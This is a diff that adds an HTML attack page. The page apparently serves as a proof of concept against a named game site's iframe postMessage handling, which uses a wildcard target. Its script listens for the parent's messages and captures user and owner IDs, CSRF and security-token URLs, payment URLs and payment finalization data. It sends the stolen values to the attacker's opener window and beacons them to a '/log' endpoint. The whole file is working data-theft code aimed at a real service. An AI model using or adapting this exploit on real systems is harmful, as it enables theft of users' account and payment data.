@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head><title>Loading...</title></head>
+<body>
+<script>
+// This page loads inside the hijacked game_frame iframe.
+// The parent (xnxx.nutaku.net) will send playData to us via
+// n.contentWindow.postMessage({type, payload}, "*") — wildcard target.
+
+window.addEventListener('message', function(e) {
+    // Capture config message with playData (userId, CSRF URLs, etc.)
+    if (e.data && e.data.type === 'config') {
+        var playData = JSON.parse(e.data.payload);
+        var stolen = {
+            userId: playData.userId,
+            ownerId: playData.ownerId,
+            titleId: playData.titleId,
+            csrfRefreshUrl: playData.refreshCsrfTokenUrl,
+            securityTokenUrl: playData.reGenerateSecurityToken,
+            paymentUrls: playData.modalUrls
+        };
+
+        // Relay to the attacker's opener tab
+        if (window.opener) {
+            window.opener.postMessage({stolen: stolen}, '*');
+        }
+
+        // Also beacon to server
+        navigator.sendBeacon('/log', JSON.stringify(stolen));
+    }
+
+    // Capture payment finalization messages (paymentId, status)
+    if (e.data && e.data.type === 'paymentFinalization') {
+        if (window.opener) {
+            window.opener.postMessage({stolen: {payment: e.data.payload}}, '*');
+        }
+        navigator.sendBeacon('/log', JSON.stringify({payment: e.data.payload}));
+    }
+});
+</script>
+</body>
+</html>
